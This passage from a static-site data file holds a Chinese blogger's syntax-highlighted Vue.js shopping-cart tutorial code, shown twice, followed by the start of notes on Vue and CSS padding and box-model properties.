class=\"hljs-number\">1px</span> solid black;</span><br><span class=\"language-css\">        &#125;</span><br><span class=\"language-css\">        <span class=\"hljs-selector-tag\">td</span>&#123;</span><br><span class=\"language-css\">            <span class=\"hljs-attribute\">border</span>: <span class=\"hljs-number\">1px</span> solid black;</span><br><span class=\"language-css\">        &#125;</span><br><span class=\"language-css\"></span><br><span class=\"language-css\">    </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">style</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span> <span class=\"hljs-attr\">v-cloak</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">template</span> <span class=\"hljs-attr\">v-if</span>=<span class=\"hljs-string\">&quot;list.length&quot;</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">table</span>&gt;</span><br>                <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">thead</span>&gt;</span><br>                    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">tr</span>&gt;</span><br>                        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">th</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">th</span>&gt;</span><br>                        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">th</span>&gt;</span>Name<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">th</span>&gt;</span><br>                        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">th</span>&gt;</span>Price<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">th</span>&gt;</span><br>                        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">th</span>&gt;</span>Count<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">th</span>&gt;</span><br>                        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">th</span>&gt;</span>Option<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">th</span>&gt;</span><br>                    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">tr</span>&gt;</span><br>                <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">thead</span>&gt;</span><br>                <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">tbody</span>&gt;</span><br>                    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">tr</span> <span class=\"hljs-attr\">v-for</span>=<span class=\"hljs-string\">&quot;(item,index) in list&quot;</span>&gt;</span><br>                        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">td</span>&gt;</span>&#123;&#123; index+1 &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">td</span>&gt;</span><br>                        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">td</span>&gt;</span>&#123;&#123; item.name &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">td</span>&gt;</span><br>                        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">td</span>&gt;</span>&#123;&#123; item.price &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">td</span>&gt;</span><br>                        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">td</span>&gt;</span><br>                            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> @<span class=\"hljs-attr\">click</span>=<span class=\"hljs-string\">&quot;handleReduce(index)&quot;</span> <span class=\"hljs-attr\">:disabled</span>=<span class=\"hljs-string\">&quot;item.count === 1&quot;</span>&gt;</span>-<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br>                            &#123;&#123; item.count &#125;&#125;<br>                            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> @<span class=\"hljs-attr\">click</span>=<span class=\"hljs-string\">&quot;handleAdd(index)&quot;</span>&gt;</span>+<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br>                        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">td</span>&gt;</span><br>                        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">td</span>&gt;</span><br>                            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> @<span class=\"hljs-attr\">click</span>=<span class=\"hljs-string\">&quot;handleRemove(index)&quot;</span>&gt;</span>移除<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br>                        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">td</span>&gt;</span><br>                    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">tr</span>&gt;</span><br>                <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">tbody</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">table</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span>总价：¥ &#123;&#123; total &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">template</span>&gt;</span><br><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">v-else</span>&gt;</span>购物车竟然是空的，快来添加心仪的商品！<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">        <span class=\"hljs-keyword\">var</span> app = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vue</span>(&#123;</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">el</span>: <span class=\"hljs-string\">&#x27;#app&#x27;</span>,</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">data</span>: &#123;</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">list</span>: [</span><br><span class=\"language-javascript\">                    &#123;</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">id</span>: <span class=\"hljs-number\">1</span>,</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">name</span>: <span class=\"hljs-string\">&#x27;iPhone&#x27;</span>,</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">price</span>: <span class=\"hljs-number\">9998</span>,</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">count</span>: <span class=\"hljs-number\">1</span>,</span><br><span class=\"language-javascript\">                    &#125;,</span><br><span class=\"language-javascript\">                    &#123;</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">id</span>: <span class=\"hljs-number\">2</span>,</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">name</span>: <span class=\"hljs-string\">&#x27;iPad&#x27;</span>,</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">price</span>: <span class=\"hljs-number\">3988</span>,</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">count</span>: <span class=\"hljs-number\">1</span>,</span><br><span class=\"language-javascript\">                    &#125;,</span><br><span class=\"language-javascript\">                    &#123;</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">id</span>: <span class=\"hljs-number\">3</span>,</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">name</span>: <span class=\"hljs-string\">&#x27;iWatch&#x27;</span>,</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">price</span>: <span class=\"hljs-number\">2599</span>,</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">count</span>: <span class=\"hljs-number\">1</span>,</span><br><span class=\"language-javascript\">                    &#125;</span><br><span class=\"language-javascript\">                ]</span><br><span class=\"language-javascript\">            &#125;,</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">methods</span>: &#123;</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">handleAdd</span>: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">index</span>) &#123;</span><br><span class=\"language-javascript\">                    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">list</span>[index].<span class=\"hljs-property\">count</span>++;</span><br><span class=\"language-javascript\">                &#125;,</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">handleReduce</span>: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">index</span>) &#123;</span><br><span class=\"language-javascript\">                    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">list</span>[index].<span class=\"hljs-property\">count</span> === <span class=\"hljs-number\">1</span>) &#123;</span><br><span class=\"language-javascript\">                        <span class=\"hljs-keyword\">return</span>;</span><br><span class=\"language-javascript\">                    &#125;</span><br><span class=\"language-javascript\">                    <span class=\"hljs-keyword\">else</span> &#123;</span><br><span class=\"language-javascript\">                        <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">list</span>[index].<span class=\"hljs-property\">count</span>--;</span><br><span class=\"language-javascript\">                    &#125;</span><br><span class=\"language-javascript\">                &#125;,</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">handleRemove</span>: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">index</span>) &#123;</span><br><span class=\"language-javascript\">                    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">list</span>.<span class=\"hljs-title function_\">splice</span>(index, <span class=\"hljs-number\">1</span>);</span><br><span class=\"language-javascript\">                &#125;</span><br><span class=\"language-javascript\">            &#125;,</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">computed</span>: &#123;</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">total</span>: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) &#123;</span><br><span class=\"language-javascript\">                    <span class=\"hljs-keyword\">var</span> total = <span class=\"hljs-number\">0</span>;</span><br><span class=\"language-javascript\">                    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">var</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">list</span>.<span class=\"hljs-property\">length</span>; i++) &#123;</span><br><span class=\"language-javascript\">                        <span class=\"hljs-keyword\">var</span> item = <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">list</span>[i];</span><br><span class=\"language-javascript\">                        total += item.<span class=\"hljs-property\">price</span> * item.<span class=\"hljs-property\">count</span>;</span><br><span class=\"language-javascript\">                    &#125;</span><br><span class=\"language-javascript\">                    <span class=\"hljs-keyword\">return</span> total.<span class=\"hljs-title function_\">toString</span>().<span class=\"hljs-title function_\">replace</span>(<span class=\"hljs-regexp\">/\\B(?=(\\d&#123;3&#125;)+$)/g</span>, <span class=\"hljs-string\">&#x27;,&#x27;</span>);</span><br><span class=\"language-javascript\">                &#125;</span><br><span class=\"language-javascript\">            &#125;,</span><br><span class=\"language-javascript\">        &#125;)</span><br><span class=\"language-javascript\">    </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;../Nowebpack/js/shopping_car.js&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\">//一个购物车实例<br>//重点在数据的绑定和computed属性，methods方法在后面的章节<br><span class=\"hljs-meta\">&lt;!DOCTYPE <span class=\"hljs-keyword\">html</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span> <span class=\"hljs-attr\">lang</span>=<span class=\"hljs-string\">&quot;en&quot;</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">charset</span>=<span class=\"hljs-string\">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">&quot;viewport&quot;</span> <span class=\"hljs-attr\">content</span>=<span class=\"hljs-string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">title</span>&gt;</span>Document<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">title</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;./js/vue.js&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">style</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;text/css&quot;</span>&gt;</span><span class=\"language-css\"></span><br><span class=\"language-css\">        <span class=\"hljs-selector-tag\">table</span> &#123;</span><br><span class=\"language-css\">            <span class=\"hljs-attribute\">border</span>: <span class=\"hljs-number\">1px</span> solid black;</span><br><span class=\"language-css\">        &#125;</span><br><span class=\"language-css\">        <span class=\"hljs-selector-tag\">th</span>&#123;</span><br><span class=\"language-css\">            <span class=\"hljs-attribute\">border</span>: <span class=\"hljs-number\">1px</span> solid black;</span><br><span class=\"language-css\">        &#125;</span><br><span class=\"language-css\">        <span class=\"hljs-selector-tag\">td</span>&#123;</span><br><span class=\"language-css\">            <span class=\"hljs-attribute\">border</span>: <span class=\"hljs-number\">1px</span> solid black;</span><br><span class=\"language-css\">        &#125;</span><br><span class=\"language-css\"></span><br><span class=\"language-css\">    </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">style</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span> <span class=\"hljs-attr\">v-cloak</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">template</span> <span class=\"hljs-attr\">v-if</span>=<span class=\"hljs-string\">&quot;list.length&quot;</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">table</span>&gt;</span><br>                <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">thead</span>&gt;</span><br>                    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">tr</span>&gt;</span><br>                        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">th</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">th</span>&gt;</span><br>                        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">th</span>&gt;</span>Name<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">th</span>&gt;</span><br>                        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">th</span>&gt;</span>Price<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">th</span>&gt;</span><br>                        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">th</span>&gt;</span>Count<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">th</span>&gt;</span><br>                        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">th</span>&gt;</span>Option<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">th</span>&gt;</span><br>                    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">tr</span>&gt;</span><br>                <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">thead</span>&gt;</span><br>                <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">tbody</span>&gt;</span><br>                    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">tr</span> <span class=\"hljs-attr\">v-for</span>=<span class=\"hljs-string\">&quot;(item,index) in list&quot;</span>&gt;</span><br>                        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">td</span>&gt;</span>&#123;&#123; index+1 &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">td</span>&gt;</span><br>                        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">td</span>&gt;</span>&#123;&#123; item.name &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">td</span>&gt;</span><br>                        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">td</span>&gt;</span>&#123;&#123; item.price &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">td</span>&gt;</span><br>                        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">td</span>&gt;</span><br>                            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> @<span class=\"hljs-attr\">click</span>=<span class=\"hljs-string\">&quot;handleReduce(index)&quot;</span> <span class=\"hljs-attr\">:disabled</span>=<span class=\"hljs-string\">&quot;item.count === 1&quot;</span>&gt;</span>-<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br>                            &#123;&#123; item.count &#125;&#125;<br>                            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> @<span class=\"hljs-attr\">click</span>=<span class=\"hljs-string\">&quot;handleAdd(index)&quot;</span>&gt;</span>+<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br>                        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">td</span>&gt;</span><br>                        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">td</span>&gt;</span><br>                            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> @<span class=\"hljs-attr\">click</span>=<span class=\"hljs-string\">&quot;handleRemove(index)&quot;</span>&gt;</span>移除<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br>                        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">td</span>&gt;</span><br>                    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">tr</span>&gt;</span><br>                <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">tbody</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">table</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span>总价：¥ &#123;&#123; total &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">template</span>&gt;</span><br><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">v-else</span>&gt;</span>购物车竟然是空的，快来添加心仪的商品！<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">        <span class=\"hljs-keyword\">var</span> app = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vue</span>(&#123;</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">el</span>: <span class=\"hljs-string\">&#x27;#app&#x27;</span>,</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">data</span>: &#123;</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">list</span>: [</span><br><span class=\"language-javascript\">                    &#123;</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">id</span>: <span class=\"hljs-number\">1</span>,</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">name</span>: <span class=\"hljs-string\">&#x27;iPhone&#x27;</span>,</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">price</span>: <span class=\"hljs-number\">9998</span>,</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">count</span>: <span class=\"hljs-number\">1</span>,</span><br><span class=\"language-javascript\">                    &#125;,</span><br><span class=\"language-javascript\">                    &#123;</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">id</span>: <span class=\"hljs-number\">2</span>,</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">name</span>: <span class=\"hljs-string\">&#x27;iPad&#x27;</span>,</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">price</span>: <span class=\"hljs-number\">3988</span>,</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">count</span>: <span class=\"hljs-number\">1</span>,</span><br><span class=\"language-javascript\">                    &#125;,</span><br><span class=\"language-javascript\">                    &#123;</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">id</span>: <span class=\"hljs-number\">3</span>,</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">name</span>: <span class=\"hljs-string\">&#x27;iWatch&#x27;</span>,</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">price</span>: <span class=\"hljs-number\">2599</span>,</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">count</span>: <span class=\"hljs-number\">1</span>,</span><br><span class=\"language-javascript\">                    &#125;</span><br><span class=\"language-javascript\">                ]</span><br><span class=\"language-javascript\">            &#125;,</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">methods</span>: &#123;</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">handleAdd</span>: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">index</span>) &#123;</span><br><span class=\"language-javascript\">                    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">list</span>[index].<span class=\"hljs-property\">count</span>++;</span><br><span class=\"language-javascript\">                &#125;,</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">handleReduce</span>: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">index</span>) &#123;</span><br><span class=\"language-javascript\">                    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">list</span>[index].<span class=\"hljs-property\">count</span> === <span class=\"hljs-number\">1</span>) &#123;</span><br><span class=\"language-javascript\">                        <span class=\"hljs-keyword\">return</span>;</span><br><span class=\"language-javascript\">                    &#125;</span><br><span class=\"language-javascript\">                    <span class=\"hljs-keyword\">else</span> &#123;</span><br><span class=\"language-javascript\">                        <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">list</span>[index].<span class=\"hljs-property\">count</span>--;</span><br><span class=\"language-javascript\">                    &#125;</span><br><span class=\"language-javascript\">                &#125;,</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">handleRemove</span>: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">index</span>) &#123;</span><br><span class=\"language-javascript\">                    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">list</span>.<span class=\"hljs-title function_\">splice</span>(index, <span class=\"hljs-number\">1</span>);</span><br><span class=\"language-javascript\">                &#125;</span><br><span class=\"language-javascript\">            &#125;,</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">computed</span>: &#123;</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">total</span>: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) &#123;</span><br><span class=\"language-javascript\">                    <span class=\"hljs-keyword\">var</span> total = <span class=\"hljs-number\">0</span>;</span><br><span class=\"language-javascript\">                    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">var</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">list</span>.<span class=\"hljs-property\">length</span>; i++) &#123;</span><br><span class=\"language-javascript\">                        <span class=\"hljs-keyword\">var</span> item = <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">list</span>[i];</span><br><span class=\"language-javascript\">                        total += item.<span class=\"hljs-property\">price</span> * item.<span class=\"hljs-property\">count</span>;</span><br><span class=\"language-javascript\">                    &#125;</span><br><span class=\"language-javascript\">                    <span class=\"hljs-keyword\">return</span> total.<span class=\"hljs-title function_\">toString</span>().<span class=\"hljs-title function_\">replace</span>(<span class=\"hljs-regexp\">/\\B(?=(\\d&#123;3&#125;)+$)/g</span>, <span class=\"hljs-string\">&#x27;,&#x27;</span>);</span><br><span class=\"language-javascript\">                &#125;</span><br><span class=\"language-javascript\">            &#125;,</span><br><span class=\"language-javascript\">        &#125;)</span><br><span class=\"language-javascript\">    </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;../Nowebpack/js/shopping_car.js&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n"},{"title":"Vue笔记","date":"2020-11-29T13:18:45.000Z","mp3":null,"cover":"img/vue.png","_content":"\n\nVue实战问题\n\n- [ ] 1.VScode中部分组件调用显示蓝色，部分显示红色？\n\n- [x] 2.标签组件出现Bug,无法显示标题，有待解决；\n\nCSS特性\n\n1. cursor规定要显示的光标的类型，此处pointer为一只手\n2. CSS 框模型概述\n\n\n\n![CSS 框模型](https://www.w3school.com.cn/i/ct_boxmodel.gif)\n\n3.padding 属性定义元素的内边距。padding 属性接受长度值或百分比值，但不允许使用负值\n\n```\nh1 {padding: 10px 0.25em 2ex 20%;}\n```\n\n**注意：**上下内边距与左右内边距一致；即上下内边距的百分数会相对于父元素宽度设置，而不是相对于高度。\n\n4.border 